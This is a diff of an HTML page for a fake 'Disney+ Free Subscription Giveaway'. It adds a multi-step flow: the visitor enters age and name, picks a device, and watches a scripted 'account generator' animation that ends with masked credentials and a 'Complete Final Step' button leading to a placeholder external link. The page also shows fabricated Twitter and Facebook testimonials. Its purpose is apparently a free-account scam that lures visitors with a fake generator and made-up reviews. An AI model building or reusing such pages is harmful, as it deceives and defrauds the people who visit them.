@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Disney+ Free Subscription Contest</title>
+  <title>Disney+ Free Subscription Giveaway</title>
   <style>
     * {
       margin: 0;
@@ -12,26 +12,27 @@
     }
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(to right, #0f172a, #1e3a8a);
+      background: linear-gradient(to right, #000428, #004e92);
       color: #fff;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
+      justify-content: flex-start;
       align-items: center;
       min-height: 100vh;
       padding: 20px;
-      flex-direction: column;
     }
     .card {
-      background: #1e293b;
+      background: #0d1b2a;
       border-radius: 16px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
       max-width: 600px;
       width: 100%;
       padding: 30px;
+      margin-bottom: 20px;
     }
     h1 {
       text-align: center;
-      color: #60a5fa;
+      color: #00b4d8;
       font-size: 2rem;
       margin-bottom: 15px;
     }
@@ -39,7 +40,7 @@
       text-align: center;
       margin-bottom: 25px;
       font-size: 1.05rem;
-      color: #d1d5db;
+      color: #ccc;
     }
     img.responsive {
       width: 100%;
@@ -51,21 +52,22 @@
       display: block;
       margin-bottom: 6px;
       font-weight: 600;
+      color: #fff;
     }
     input[type="text"], select {
       width: 100%;
       padding: 12px;
-      border: 1px solid #374151;
+      border: 1px solid #00b4d8;
+      background: #1b263b;
+      color: #fff;
       border-radius: 8px;
       margin-bottom: 20px;
       font-size: 1rem;
-      background: #111827;
-      color: #fff;
     }
     .btn {
       width: 100%;
       padding: 14px;
-      background: #3b82f6;
+      background: #00b4d8;
       color: #fff;
       border: none;
       border-radius: 10px;
@@ -74,46 +76,71 @@
       transition: background 0.3s ease;
     }
     .btn:hover {
-      background: #2563eb;
+      background: #0096c7;
     }
-    .device-buttons {
-      display: flex;
-      gap: 15px; /* مسافة بين أزرار Android و iOS */
-      margin-top: 20px;
-      margin-bottom: 20px;
+    .requirements {
+      margin-top: 30px;
+      font-size: 0.95rem;
+      color: #ddd;
     }
-    .generator-box {
-      background: #111827;
-      padding: 15px;
-      border-radius: 10px;
-      margin-bottom: 20px; /* مسافة بين البيانات وزر Final Step */
-      font-family: monospace;
+    .requirements ul {
+      padding-left: 20px;
+      margin-top: 10px;
     }
     .comments {
-      margin-top: 35px;
-      background: #1e293b;
+      margin-top: 20px;
+      background: rgba(255, 255, 255, 0.05);
       padding: 15px;
       border-radius: 12px;
+      max-width: 600px;
+      width: 100%;
     }
     .comment {
       margin-bottom: 15px;
       padding-bottom: 10px;
-      border-bottom: 1px solid #374151;
-    }
-    .comment:last-child {
-      border-bottom: none;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
     }
     .comment strong {
-      color: #60a5fa;
+      color: #00b4d8;
+    }
+    /* Generator animation */
+    .generator {
+      text-align: center;
+      display: none;
+      margin-top: 20px;
+    }
+    .loading {
+      color: #00b4d8;
+      font-size: 1.2rem;
+      margin-bottom: 10px;
+    }
+    .credentials {
+      background: #1b263b;
+      padding: 10px;
+      border-radius: 8px;
+      display: inline-block;
+      margin-top: 10px;
+      margin-bottom: 20px; /* ✅ تمت إضافتها لترك مسافة قبل الزر */
+    }
+
+    /* ✅ زرّي Android و iOS */
+    .button-group {
+      display: flex;
+      gap: 15px;
+      justify-content: center;
+      margin-top: 20px;
+    }
+    .button-group .btn {
+      width: 45%;
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h1>Disney+ Free Subscription</h1>
-    <p class="description">Join now for a chance to win a free Disney+ account for 1 year!</p>
+  <div class="card" id="step1">
+    <h1>Disney+ Free Subscription Giveaway</h1>
+    <p class="description">Enter now for a chance to get a 1-year Disney+ subscription completely free!</p>
 
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg" alt="Disney+ Logo" class="responsive" />
+    <img src="https://i.ibb.co/0GzGf1t/disneyplus.jpg" alt="Disney+ Giveaway" class="responsive" />
 
     <label for="age">Are you over 18 or younger?</label>
     <select id="age" name="age" required>
@@ -125,26 +152,79 @@
     <label for="name">Your name</label>
     <input type="text" id="name" name="name" placeholder="Enter your full name" required />
 
-    <div class="device-buttons">
-      <button class="btn">Android</button>
-      <button class="btn">iOS</button>
-    </div>
+    <button class="btn" onclick="showDeviceStep()">Enter Contest</button>
 
-    <div class="generator-box">
-      Username: john_doe92@example.com<br>
-      Password: ***********
-    </div>
-
-    <button class="btn">Final Step</button>
-
-    <div class="comments">
-      <h3>User Comments:</h3>
-      <div class="comment"><strong>@SarahK (Twitter):</strong> Just got my Disney+ account, works great!</div>
-      <div class="comment"><strong>Mike L. (Facebook):</strong> Wasn't sure at first, but it's real.</div>
-      <div class="comment"><strong>@MovieFan88 (Twitter):</strong> Streaming my favorite shows now, thanks!</div>
-      <div class="comment"><strong>Emma R. (Facebook):</strong> Super easy to join and totally worth it.</div>
-      <div class="comment"><strong>@StreamKing (Twitter):</strong> The generator is so cool to watch!</div>
+    <div class="requirements">
+      <h3>Entry Requirements:</h3>
+      <ul>
+        <li>Must be at least 18 years old</li>
+        <li>Valid email required for winner confirmation</li>
+        <li>One entry per person</li>
+        <li>No credit card required</li>
+      </ul>
     </div>
   </div>
+
+  <div class="card" id="step2" style="display:none;">
+    <h1>Select Your Device</h1>
+    <div class="button-group">
+      <button class="btn" onclick="startGenerator('Android')">Android</button>
+      <button class="btn" onclick="startGenerator('iOS')">iOS</button>
+    </div>
+  </div>
+
+  <div class="card" id="step3" style="display:none;">
+    <h1>Generating Your Disney+ Account...</h1>
+    <div class="generator" id="generator">
+      <div class="loading" id="loadingText">Connecting to Disney+ servers...</div>
+      <div class="credentials" id="credentials" style="display:none;">
+        <p><strong>Username:</strong> user****@mail.com</p>
+        <p><strong>Password:</strong> *******</p>
+      </div>
+      <button class="btn" id="finalStepBtn" style="display:none;" onclick="window.location.href='https://your-final-link.com'">Complete Final Step</button>
+    </div>
+  </div>
+
+  <div class="comments">
+    <h3>User Comments:</h3>
+    <div class="comment"><strong>@MovieFan88 (Twitter):</strong> I just got mine! Streaming all Marvel movies now 🎉</div>
+    <div class="comment"><strong>Sarah K. (Facebook):</strong> Easy steps, and it worked for me!</div>
+    <div class="comment"><strong>@PixarLover (Twitter):</strong> This is awesome, thank you!</div>
+    <div class="comment"><strong>Tom R. (Facebook):</strong> Can’t believe I got a whole year free 🤯</div>
+    <div class="comment"><strong>@StarWarsGeek (Twitter):</strong> Watching The Mandalorian right now!</div>
+  </div>
+
+  <script>
+    function showDeviceStep() {
+      document.getElementById('step1').style.display = 'none';
+      document.getElementById('step2').style.display = 'block';
+      window.scrollTo(0,0);
+    }
+    function startGenerator(device) {
+      document.getElementById('step2').style.display = 'none';
+      document.getElementById('step3').style.display = 'block';
+      document.getElementById('generator').style.display = 'block';
+      let messages = [
+        "Connecting to Disney+ servers...",
+        "Checking available accounts...",
+        "Encrypting credentials...",
+        "Finalizing setup..."
+      ];
+      let index = 0;
+      let loadingText = document.getElementById('loadingText');
+      let interval = setInterval(() => {
+        if (index < messages.length) {
+          loadingText.textContent = messages[index];
+          index++;
+        } else {
+          clearInterval(interval);
+          loadingText.style.display = 'none';
+          document.getElementById('credentials').style.display = 'block';
+          document.getElementById('finalStepBtn').style.display = 'block';
+          window.scrollTo(0,document.body.scrollHeight);
+        }
+      }, 1500);
+    }
+  </script>
 </body>
 </html>
